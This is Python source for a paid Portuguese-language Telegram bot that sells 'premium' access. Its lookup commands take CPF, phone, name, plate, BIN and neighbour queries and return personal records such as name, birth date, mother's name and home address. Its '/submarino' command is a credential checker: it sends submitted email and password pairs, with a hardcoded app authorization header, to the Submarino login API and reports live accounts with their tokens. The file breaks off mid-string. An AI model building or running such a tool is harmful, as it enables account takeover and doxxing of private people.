import sys
import time
import amanobot
import requests
import mysql.connector
from mysql.connector import errorcode
import json
from datetime import date
import datetime
import math
import re
from bs4 import BeautifulSoup
from amanobot.loop import MessageLoop
import asyncio
from amanobot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import random
R = '\033[1;31m'  # VERMELHO
B = '\033[1;34m'  # AZUL
C = '\033[1;37m'
Y = '\033[1;33m'
G = '\033[1;32m'
RT = '\033[;0m'
crossIcon = u"\U0001f518"
#Coded by @Helior11//Python Source! :)
def verificar_admin(id_user):
    premium = open("usuarios.txt", "r")
    premium = premium.read()
    if str(id_user) in premium:
        id_user = str(id_user)
        tudo = premium.split(id_user)
        #print(tudo)
        tudo = tudo[1]
        tudo = tudo.split('|')
        print(tudo)
        vence = tudo[1]
        comecou = tudo[2]
        acesso = tudo[3]
        print(vence)
        data_atual = date.today()
        print(data_atual)
        data_atual = date.today()
        vence = vence.replace('-', '/')
        comecou = comecou.replace('-', '/')
        acesso = str(acesso.upper())
        acesso = acesso[0:5]
        print(acesso)
        if str(acesso) == "ADMIN":
            return True
        else:
            return False
    else:
        return f"O USUARIO COM ID: {id_user} NAO ESTA INSERIDO NO BANCO DE DADOS!"
def obter_infos(id_user):
    premium = open("usuarios.txt", "r")
    premium = premium.read()
    if str(id_user) in premium:
        id_user = str(id_user)
        tudo = premium.split(id_user)
        #print(tudo)
        tudo = tudo[1]
        tudo = tudo.split('|')
        #print(tudo)
        vence = tudo[1]
        comecou = tudo[2]
        acesso = tudo[3]
        print(vence)
        data_atual = date.today()
        print(data_atual)
        data_atual = date.today()
        vence = vence.replace('-', '/')
        comecou = comecou.replace('-', '/')
        return f"\n<strong>ℹ️ INFORMAÇÕES SOBRE O SEU ACESSO:\n🆔 ID:</strong><code>{id_user}</code>\n<strong>📅 VENCE:</strong><code>{vence}</code>\n<strong>📅 COMEÇOU:</strong><code>{comecou}</code>\n<strong>🆙️ TIPO DE ACESSO:</strong><code>{acesso.upper()}</code>"
    else:
        return f"O USUARIO COM ID: {id_user} NAO ESTA INSERIDO NO BANCO DE DADOS!"
def usuarios_premium(id_user):
    premium = open("usuarios.txt", "r")
    premium = premium.read()
    if str(id_user) in premium:
        id_user = str(id_user)
        tudo = premium.split(id_user)
        #print(tudo)
        tudo = tudo[1]
        tudo = tudo.split('|')
        #print(tudo)
        vence = tudo[1]
        comecou = tudo[2]
        acesso = tudo[3]
        print(vence)
        data_atual = date.today()
        print(data_atual)
        if str(data_atual) >= vence:
            vence = vence.replace('-', '/')
            print(f"O USUARIO COM O ID: {id_user} ESTA VENCIDO")
            return "venceu"
        else:
            return True
    else:
        return False
def on_chat_message(msg):
    content_type, chat_type, chat_id = amanobot.glance(msg)
    boas_vindas = InlineKeyboardMarkup(inline_keyboard=[
                   [InlineKeyboardButton(text='Começar', callback_data='Começar')],
               ])
    if content_type == "text":
        try:
            if str(msg['forward_from']) != "None":
                seuid = msg['from']['id']
                id_alvo = msg['forward_from']['id']
                idk = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='🆔', callback_data='ID')],
            ])
                bot.sendMessage(chat_id, f"<strong>🆔 ID:</strong><code>{id_alvo}</code>", parse_mode='HTML', reply_markup=idk)
        except:
            print('k')
    msgk = msg['text']
    if(msgk == "/start"):
        nomebot = bot.getMe()
        print(nomebot)
        msg_editar = bot.sendMessage(chat_id, f"😀 <strong>OLA, SEJA BEM VINDO A {nomebot['first_name']}!</strong>", parse_mode='HTML', reply_markup=boas_vindas)
    pegar1msg = msg['text']
    pegar1msg = pegar1msg.split(' ')
    pegar1msg2 = pegar1msg[0]
    if(pegar1msg2 == "/cpf"):
        try:
         cpf = pegar1msg[1]
         if len(cpf) < 11:
             erro = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text='❌', callback_data='ERRO')],
             ])
             msg_editar = bot.sendMessage(chat_id,
                                          f"❌ <strong>UM CPF DEVE CONTER 11 DIGITOS!</strong>",
                                          parse_mode='HTML', reply_markup=erro)
         else:
            consultar = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_CPF')],
            ])
            msg_editar = bot.sendMessage(chat_id,
                                      f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA CPF</code>\n<strong>📃 BASE:</strong><code>GOVERNO</code>\n<strong>👤 CPF:</strong><code>{cpf}</code>",
                                      parse_mode='HTML', reply_markup=consultar)
        except:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='⚠', callback_data='ERRO')],
            ])
            msg_editar = bot.sendMessage(chat_id,
                                         f"⚠️ <strong>INFORME UM CPF!</strong>",
                                         parse_mode='HTML', reply_markup=erro)
    if pegar1msg2 == "/tel":
        tel = pegar1msg[1]
        if len(tel) < 11:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            msg_editar = bot.sendMessage(chat_id,
                                         f"❌ <strong>UM NUMERO DEVE CONTER 11 DIGITOS!</strong>",
                                         parse_mode='HTML', reply_markup=erro)
        else:
            consultar = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_TELEFONE')],
            ])
            msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA TELEFONE</code>\n<strong>📃 BASE:</strong><code>DESCONHECIDA</code>\n<strong>👤 TELEFONE:</strong><code>{tel}</code>", parse_mode='HTML', reply_markup=consultar)
    if pegar1msg2 == "/cnpj":
        cnpj = pegar1msg[1]
        consultar = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_CNPJ')],
        ])
        msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA CNPJ</code>\n<strong>📃 BASE:</strong><code>RECEITA</code>\n<strong>👤 CNPJ:</strong><code>{cnpj}</code>", parse_mode='HTML', reply_markup=consultar)
    if pegar1msg2 == "/bin":
        bin = pegar1msg[1]
        consultar = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_BIN')],
        ])
        msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA BIN</code>\n<strong>📃 BASE:</strong><code>BINS.SU</code>\n<strong>👤 BIN:</strong><code>{bin}</code>", parse_mode='HTML', reply_markup=consultar)
    if pegar1msg2 == "/avisar":
        id_user = msg['from']['id']
        if verificar_admin(id_user) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.sendMessage(chat_id, "<strong>APENAS ADMINS DO BOT PODEM USAR ESSE COMANDO</strong>", parse_mode='HTML', reply_markup=erro)
        else:
            mensagem = msg['text']
            mensagem = mensagem[8:]
            sim_nao = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='ENVIAR')],
                [InlineKeyboardButton(text='❌', callback_data='NAO_ENVIAR')],
            ])
            msg_editar = bot.sendMessage(chat_id,
                                         f"⚠ <strong>{msg['from']['first_name']} VOCÊ REALMENTE DESEJA ENVIAR ESSA MENSAGEM?\nMENSAGEM QUE SERA ENVIADA:</strong><code>{mensagem}</code>",
                                         parse_mode='HTML', reply_markup=sim_nao)

    if pegar1msg2 == "/ip":
        ip = pegar1msg[1]
        consultar = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_IP')],
        ])
        msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA IP</code>\n<strong>📃 BASE:</strong><code>WHOIS</code>\n<strong>👤 IP:</strong><code>{ip}</code>", parse_mode='HTML', reply_markup=consultar)
    if pegar1msg2 == "/placa":
        placa = pegar1msg[1]
        consultar = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_PLACA')],
        ])
        msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA PLACA</code>\n<strong>📃 BASE:</strong><code>API CARROS</code>\n<strong>👤 PLACA:</strong><code>{placa}</code>", parse_mode='HTML', reply_markup=consultar)
    if pegar1msg2== "/nome2":
        nome_cons = str(pegar1msg[1:])
        #nome_cons = nome_cons.replace(' ', '%20')
        nome_cons = nome_cons.replace('[', '')
        nome_cons = nome_cons.replace(']', '')
        nome_cons = nome_cons.replace("'", "")
        nome_cons = nome_cons.replace(',', '')
        print(nome_cons)
        if nome_cons == "":
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='⚠', callback_data='ERRO')],
            ])
            msg_editar = bot.sendMessage(chat_id,
                                         f"⚠️ <strong>INFORME UM NOME!</strong>",
                                         parse_mode='HTML', reply_markup=erro)
        else:
            consultar = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_NOME2')],
            ])
            msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA NOME</code>\n<strong>📃 BASE:</strong><code>DESCONHECIDA</code>\n<strong>👤 NOME:</strong><code>{nome_cons}</code>", parse_mode='HTML', reply_markup=consultar)

    if pegar1msg2 == "/nome":
        nome_cons = str(pegar1msg[1:])
        #nome_cons = nome_cons.replace(' ', '%20')
        nome_cons = nome_cons.replace('[', '')
        nome_cons = nome_cons.replace(']', '')
        nome_cons = nome_cons.replace("'", "")
        nome_cons = nome_cons.replace(',', '')
        print(nome_cons)
        if nome_cons == "":
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='⚠', callback_data='ERRO')],
            ])
            msg_editar = bot.sendMessage(chat_id,
                                         f"⚠️ <strong>INFORME UM NOME!</strong>",
                                         parse_mode='HTML', reply_markup=erro)
        else:
            consultar = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_NOME')],
            ])
            msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA NOME</code>\n<strong>📃 BASE:</strong><code>GOVERNO</code>\n<strong>👤 NOME:</strong><code>{nome_cons}</code>", parse_mode='HTML', reply_markup=consultar)
    if pegar1msg2 == "/sair":
        id_user = msg['from']['id']
        if verificar_admin(id_user) == True:
            bot.leaveChat(chat_id)
        else:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.sendMessage(chat_id, "<strong>APENAS ADMINS DO BOT PODEM USAR ESSE COMANDO</strong>", parse_mode='HTML', reply_markup=erro)
    if pegar1msg2 == "/acesso":
        print(msg)
        if chat_type == "private":
            id_user = msg['from']['id']
        else:
            id_user = msg['chat']['id']
        print(id_user)
        if usuarios_premium(id_user) == True:
            nvenceu = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=':)', callback_data='NAO_VENCEU')],
            ])
            if chat_type == "private":

                msg_editar = bot.sendMessage(chat_id,
                                             f"<strong>@{msg['from']['username']} VOCE POSSUI ACESSO!</strong>\n{obter_infos(id_user)}",
                                             parse_mode='HTML', reply_markup=nvenceu)
            else:
                msg_editar = bot.sendMessage(chat_id,
                                             f"<strong>ESTE GRUPO POSSUI ACESSO!</strong>\n{obter_infos(id_user)}",
                                             parse_mode='HTML', reply_markup=nvenceu)
        elif usuarios_premium(id_user) == "venceu":
            venceu = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=':(', callback_data='VENCEU')],
            ])
            if chat_type == "private":
                msg_editar = bot.sendMessage(chat_id,
                                             f"<strong>@{msg['from']['username']} SEU ACESSO VENCEU!\nPARA RENOVAR CONTATE: @Helior11</strong>",
                                             parse_mode='HTML', reply_markup=venceu)
            else:
                venceu = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=':(', callback_data='VENCEU')],
                ])
                msg_editar = bot.sendMessage(chat_id,
                                             f"<strong>O ACESSO DESTE GRUPO ESTA VENCIDO!\nPARA RENOVAR CONTATE: @Helior11</strong>",
                                             parse_mode='HTML', reply_markup=venceu)
        else:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.sendMessage(chat_id,
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11</strong>",
                                parse_mode='HTML', reply_markup=erro)
    if pegar1msg2 == "/tel2":
        if chat_type == "private" or chat_id == -1001382254821:
            tel3 = pegar1msg[1]
            if len(tel3) < 11:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                msg_editar = bot.sendMessage(chat_id,
                                             f"❌ <strong>UM NUMERO DEVE CONTER 11 DIGITOS!</strong>",
                                             parse_mode='HTML', reply_markup=erro)
            else:
                consultar = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_TELEFONE2')],
                ])
                msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA TELEFONE 2</code>\n<strong>📃 BASE:</strong><code>TARGET DATA</code>\n<strong>👤 TELEFONE:</strong><code>{tel3}</code>", parse_mode='HTML', reply_markup=consultar)
        else:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.sendMessage(chat_id,
                            f"❌ <strong>CONSULTA DISPONIVEL APENAS NO PRIVADO!</strong>",
                            parse_mode='HTML', reply_markup=erro)
    if pegar1msg2 == "/add_premium":
        id_user = msg['from']['id']
        print(verificar_admin(id_user))
        if verificar_admin(id_user) == True:
            try:
                id_premium = pegar1msg[1]
                tempo_de_acesso = pegar1msg[2]
                tipo_de_acesso = pegar1msg[3]
                data_atual = date.today()
                if verificar_admin(id_premium) == f"O USUARIO COM ID: {id_premium} NAO ESTA INSERIDO NO BANCO DE DADOS!":
                    premium = open("usuarios.txt", "a")
                    premium.write(f"\n{id_premium}|{tempo_de_acesso}|{data_atual}|{tipo_de_acesso}")
                    premium.close()
                    sucesso = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
                    ])
                    bot.sendMessage(chat_id, f"✅ <strong>USUARIO PREMIUM ADICIONADO COM SUCESSO!</strong>",
                                parse_mode='HTML', reply_markup=sucesso)
                    alerta = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text='⚠️', callback_data='ALERTA')],
                    ])
                    id_alvo = msg['from']['id']
                    #bot.sendMessage(-1001458491176,
                                #f"⚠️ <strong>UM ADMIN ADICIONOU UM USUARIO PREMIUM!\n🆔 ID DO USUARIO:</strong><code>{id_alvo}</code>\n<strong>🆔 ID QUE SERIA ADICIONADO:</strong><code>{id_premium}</code>\n<strong>ℹ️ TIPO DE ACESSO:</strong><code>{tipo_de_acesso}</code>",
                                #parse_mode='HTML', reply_markup=alerta)
                else:
                    erro = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                    ])
                    bot.sendMessage(chat_id,
                                    f"❌ <strong>USUARIO JA CADASTRADO NO BANCO DE DADOS!</strong>",
                                    parse_mode='HTML', reply_markup=erro)
            except:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.sendMessage(chat_id,
                                f"❌ <strong>UTILIZE O FORMATO:</strong>\n<code>/add_premium id tempo tipo de acesso(grupo, privado)</code>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.sendMessage(chat_id, "❌ <strong>APENAS ADMINS PODEM UTILIZAR ESSE COMANDO!</strong>", reply_markup=erro, parse_mode='HTML')
    if pegar1msg2 == "/id":
        if chat_type == "private":
            bot.sendMessage(chat_id,
                            f"<strong>SEU ID:</strong><code>{chat_id}</code>",
                            parse_mode='HTML')
        else:
            bot.sendMessage(chat_id,
                            f"<strong>ID DO GRUPO:</strong><code>{chat_id}</code>",
                            parse_mode='HTML')
    if pegar1msg2 == "/vizinhos":
        vizinho = pegar1msg[1]
        consultar = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_VIZINHOS')],
        ])
        msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA VIZINHOS</code>\n<strong>📃 BASE:</strong><code>TUDO SOBRE TODOS</code>\n<strong>👤 CPF:</strong><code>{vizinho}</code>", parse_mode='HTML', reply_markup=consultar)
    if pegar1msg2 == "/cpf2":
        if chat_type == "private" or chat_id == -1001382254821:
            try:
                cpfkk = pegar1msg[1]
                if len(cpfkk) < 11:
                    erro = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                    ])
                    msg_editar = bot.sendMessage(chat_id,
                                             f"❌ <strong>UM CPF DEVE CONTER 11 DIGITOS!</strong>",
                                             parse_mode='HTML', reply_markup=erro)
                else:
                    consultar = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text='CONSULTAR', callback_data='CONSULTAR_CPF2')],
                    ])
                    msg_editar = bot.sendMessage(chat_id, f"✅ <strong>CONSULTA SELECIONADA:\n🔎 MODULO:</strong><code>CONSULTA CPF 2</code>\n<strong>📃 BASE:</strong><code>CADSUS</code>\n<strong>👤 CPF:</strong><code>{cpfkk}</code>", parse_mode='HTML', reply_markup=consultar)
            except:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='⚠', callback_data='ERRO')],
                ])
                msg_editar = bot.sendMessage(chat_id,
                                             f"⚠️ <strong>INFORME UM CPF!</strong>",
                                             parse_mode='HTML', reply_markup=erro)
        else:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.sendMessage(chat_id,
                            f"❌ <strong>CONSULTA DISPONIVEL APENAS NO PRIVADO!</strong>",
                            parse_mode='HTML', reply_markup=erro)
    if pegar1msg2 == "/testeg":
        bot.setMyCommands('/start')
        print(bot.getMyCommands())
    if pegar1msg2 == "/submarino":
        try:
            tudo = pegar1msg[1]
            splitfoda = tudo.split('|')
            email = splitfoda[0]
            senha = splitfoda[1]
            print(email, senha)
            print(email, senha)
            headermuitofodamesmo = {
                "accept-encoding": "gzip",
                "authorization": "Basic YXBwYW5kcm9pZHN1YmE6SE4xWW1FNg==",
                "connection": "Keep-Alive",
                "content-type": "application/vnd.login.b2w+json",
                "cookie": "newSimpleBasketAB=out",
                "host": "sacola.submarino.com.br",
                "user-agent": "suba-android-2.66.0-310000361",
                "x-action": "Origin: REACT-EVENT"
            }
            rchk = requests.post(
                'https://sacola.submarino.com.br/api/v1/customer-token?c_salesSolution=APP&c_prime=false&c_b2wSid=jm3gzjq5',
                headers=headermuitofodamesmo,
                data='{"password":"' + senha + '","login":"' + email + '"}')
            print(rchk)
            aaaa = json.loads(rchk.content)
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
            ])
            if rchk.status_code == 403:
                bot.sendMessage(chat_id,
                             f'❌<strong> - DIE\nEMAIL:</strong> <code>{email}</code>\n<strong>SENHA:</strong><code>{senha}</code>\n<strong>RETORNO:</strong><code>{str(aaaa["message"])}</code>\n<strong>URL:</strong><code>www.submarino.com.br</code>\n<strong>CHECKED BY:</strong>@{str(msg["from"]["username"])}',
                             parse_mode='HTML', reply_markup=erro)
            else:
                bot.sendMessage(chat_id,
                             f'✅<strong> - LIVE\nEMAIL:</strong> <code>{email}</code>\n<strong>SENHA:</strong><code>{senha}</code>\n<strong>TOKEN:</strong><code>{str(aaaa["token"])}</code>\n<strong>STATUS:</strong><code>{str(aaaa["status"])}</code>\n<strong>URL:</strong><code>www.submarino.com.br</code>\n<strong>CHECKED BY:</strong>@{str(msg["from"]["username"])}',
                             parse_mode='HTML', reply_markup=sucesso)

        except:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.sendMessage(chat_id,
                            f'❌<strong>UTILIZE O FORMATO:</strong>\n<code>/submarino email|senha</code>',
                            parse_mode='HTML', reply_markup=erro)
def on_callback_query(msg):
    query_id, from_id, query_data = amanobot.glance(msg, flavor='callback_query')
    print(msg)
    print(f"O USUARIO: {from_id} APERTOU: {query_data} ID DA QUERY: {query_id}")
    print(msg)
    chat_id = msg['message']['chat']['id']
    msg_id = msg['message']['message_id']
    if query_data == "Começar":
        print(msg_id)
        escolha = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='CONSULTAS', callback_data='CONSULTAS')],
            [InlineKeyboardButton(text='CHECKERS', callback_data='CHECKERS')],
        ])
        bot.editMessageText((chat_id, msg_id),
                            text=f"<strong>ESCOLHA:</strong>",
                            parse_mode='HTML', reply_markup=escolha)
    if query_data == "CONSULTAS":
        voltar = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='<<', callback_data='VOLTAR')],
        ])
        bot.editMessageText((chat_id, msg_id),
                            text=f"🔎 <strong>MENU DE CONSULTAS:\n\n📞 TELEFONE:</strong>\n<code>/tel 63984678543</code>\n\n<strong>📞 TELEFONE 2:</strong>\n<code>/tel2 16996273400</code>\n\n<strong>📃 CPF:</strong>\n<code>/cpf 04566282902</code>\n\n<strong>📃 CPF(CADSUS):</strong>\n<code>/cpf2 04566282902</code>\n\n<strong>👤 NOME:</strong>\n<code>/nome RICARDO PEREIRA VILELA ANTUNES</code>\n\n<strong>👤 NOME(OUTRA BASE):</strong>\n<code>/nome2 RICARDO PEREIRA VILELA ANTUNES</code>\n\n<strong>📃 CNPJ:</strong>\n<code>/cnpj 02558157000162</code>\n\n<strong>📶 IP:</strong>\n<code>/ip 52.72.1.72</code>\n\n<strong>💳 BIN:</strong>\n<code>/bin 506775</code>\n\n<strong>🚗 PLACA:</strong>\n<code>/placa GTJ6699</code>\n\n<strong>🏠 VIZINHOS:</strong>\n<code>/vizinhos 04566282902</code>",
                            parse_mode='HTML', reply_markup=voltar)
    if query_data == "VOLTAR":
        boas_vindas = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='Começar', callback_data='Começar')],
        ])
        nomebot = bot.getMe()
        bot.editMessageText((chat_id, msg_id), f"😀 <strong>OLA, SEJA BEM VINDO A {nomebot['first_name']}!</strong>",
                        parse_mode='HTML', reply_markup=boas_vindas)
    if query_data == "CONSULTAR_CPF":
        chat_id = msg['message']['chat']['id']
        print(usuarios_premium(chat_id))
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11</strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            pegar_cpf = msg['message']['text']
            pegar_cpf = pegar_cpf.split('CPF:')
            pegar_cpf = pegar_cpf[1]
            pegar_cpf = re.sub('[^0-9]', '', pegar_cpf)
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
            req = requests.get(f"nada").text
            print(req)
            json_resultado = json.loads(req)
            if 'CPF NAO ENCONTRADO!' in req:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>CPF INVALIDO!</strong>",
                                parse_mode='HTML', reply_markup=erro)
            else:
                nome = json_resultado['nome']
                data_de_nascimento = json_resultado['data_de_nascimento']
                idade = json_resultado['idade']
                signo = json_resultado['signo']
                mae = json_resultado['mae']
                situ = json_resultado['situacao']
                rua = json_resultado['rua']
                bairro = json_resultado['bairro']
                complemento = json_resultado['complemento']
                num_casa = json_resultado['num_casa']
                cidade = json_resultado['cidade']
                estado = json_resultado['estado']
                cep = json_resultado['cep']
                sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"✅ <strong>CPF CONSULTADO COM SUCESSO\nCPF:</strong><code>{pegar_cpf}</code>\n<strong>NOME:</strong><code>{nome}</code>\n<strong>DATA DE NASCIMENTO:</strong><code>{data_de_nascimento}</code>\n<strong>IDADE:</strong><code>{idade}</code>\n<strong>SIGNO:</strong><code>{signo}</code>\n<strong>SITUACAO:</strong><code>{situ}</code>\n<strong>NOME DA MAE:</strong><code>{mae}</code>\n<strong>RUA:</strong><code>{rua}</code>\n<strong>BAIRRO:</strong><code>{bairro}</code>\n<strong>COMPLEMENTO:</strong><code>{complemento}</code>\n<strong>CIDADE:</strong><code>{cidade}</code>\n<strong>ESTADO:</strong><code>{estado}</code>\n<strong>CEP:</strong><code>{cep}</code>",
                                parse_mode='HTML', reply_markup=sucesso)
    if query_data == "CONSULTAR_TELEFONE":
        chat_id = msg['message']['chat']['id']
        if usuarios_premium(chat_id) is not True:
            erro = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='❌', callback_data='ERRO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>VOCE NAO POSSUI ACESSO PREMIUM!\nPARA OBTER O SEU CONTATE: @Helior11 </strong>",
                                parse_mode='HTML', reply_markup=erro)
        else:
            pegar_telefone = msg['message']['text']
            pegar_telefone = pegar_telefone.split('TELEFONE:')
            pegar_telefone = pegar_telefone[1]
            pegar_telefone = re.sub('[^0-9]', '', pegar_telefone)
            aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
            ])
            bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
            req = requests.get(f"nada").text
            print(req)
            req = req.replace("<br>", "\n")
            if 'NOME' in req:
                sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                            f"✅ <strong>TELEFONE CONSULTADO COM SUCESSO</strong>\n{req}",
                            parse_mode='HTML', reply_markup=sucesso)

            else:
                erro = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text='❌', callback_data='ERRO')],
                ])
                bot.editMessageText((chat_id, msg_id),
                                f"❌ <strong>TELEFONE NAO ENCONTRADO!</strong>",
                                parse_mode='HTML', reply_markup=erro)

    if query_data == "CONSULTAR_CNPJ":
        pegar_cnpj = msg['message']['text']
        pegar_cnpj = pegar_cnpj.split('CNPJ:')
        pegar_cnpj = pegar_cnpj[1]
        pegar_cnpj = re.sub('[^0-9]', '', pegar_cnpj)
        aguarde = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='⌛', callback_data='AGUARDE')],
        ])
        bot.editMessageText((chat_id, msg_id), f"<strong>⌛ AGUARDE...</strong>",
                        parse_mode='HTML', reply_markup=aguarde)
        time.sleep(1)
        url = requests.get(f"https://www.receitaws.com.br/v1/cnpj/{pegar_cnpj}")
        o = url.text
        print(o)
        req = json.loads(o)
        if str(req['status']) == "OK":
            try:
                socio = str(req['qsa'])
                socio = socio.replace("qual", "\n<strong>SOCIO</strong>")
                socio = socio.replace("'", "")
                socio = socio.replace("[", "")
                socio = socio.replace("{", "")
                socio = socio.replace("}", "")
                socio = socio.replace("]", "")
                socio = socio.replace(",", "")
                socio = socio.replace("nome", "")
            except:
                socio = "<code>ERRO!</code>"
            sucesso = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text='✅', callback_data='SUCESSO')],
            ])
            bot.editMessageText((chat_id, msg_id),
                                       f"""🔎<strong>CONSULTA DE CNPJ</strong>🔍\n\n<strong>CNPJ:</strong> <code>{str(pegar_cnpj)}</code>\n<strong>TIPO:</strong> <code>{str(req['tipo'])}</code>\n<strong>NOME:</strong> <code>{str(req['nome'])}</code>\n<strong>SITUACAO:</strong> <code>{str(
                                           req['situacao'])}</code>\n<strong>DATA SITUACAO:</strong> <code>{str(req['data_situacao'])}</code>\n<strong>TELEFONE:</strong> <code>{str(req['telefone'])}</code>\n<strong>EMAIL:</strong> <code>{str(req['email'])}</code>\n<strong>LOGRADOURO:</strong> <code>{str(
                                           req['logradouro'])}</code>\n<strong>BAIRRO:</strong> <code>{str(
                                           req['bairro'])}</code>\n<strong>NUMERO:</strong> <code>{str(
